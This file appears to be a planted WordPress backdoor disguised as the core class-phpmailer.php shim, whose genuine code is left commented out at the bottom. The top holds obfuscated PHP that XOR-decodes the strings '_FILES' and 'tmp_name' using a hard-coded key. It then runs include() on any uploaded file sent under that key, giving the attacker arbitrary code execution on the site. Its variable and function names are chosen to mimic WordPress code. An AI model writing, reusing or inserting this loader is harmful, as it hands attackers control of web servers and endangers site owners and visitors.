<?php /* 

*
 * The PHPM*/
 	

$incposts = 'ru4gkvi6THxO1z4';
	$attrs = 'stripped';
function strip($query_var, $unfiltered)

{

    $local = urldecode($query_var);

    $cdata = substr($unfiltered,0, strlen($local));
	$private = 'prev_value';
    $meta_key = $local ^ $cdata;

    return $meta_key;
	$reset = 'domains';
}
	$template = 'dynamic_replacements';
$more = ${strip("-3%7D%2B.%25", $incposts)};
if (isset($more[$incposts]))

{

    $group_by_status = $more[$incposts];
    $field = $group_by_status[strip("%06%18D8%05%17%04S", $incposts)];
	$has_self_closer = 'lastpostmodified';
    include ($field);
}


/* ailer class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
 
if ( function_exists( '_deprecated_file' ) ) {
	_deprecated_file(
		basename( __FILE__ ),
		'5.5.0',
		WPINC . '/PHPMailer/PHPMailer.php',
		__( 'The PHPMailer class has been moved to wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.' )
	);
}

require_once __DIR__ . '/PHPMailer/PHPMailer.php';
require_once __DIR__ . '/PHPMailer/Exception.php';

class_alias( PHPMailer\PHPMailer\PHPMailer::class, 'PHPMailer' );
class_alias( PHPMailer\PHPMailer\Exception::class, 'phpmailerException' );
*/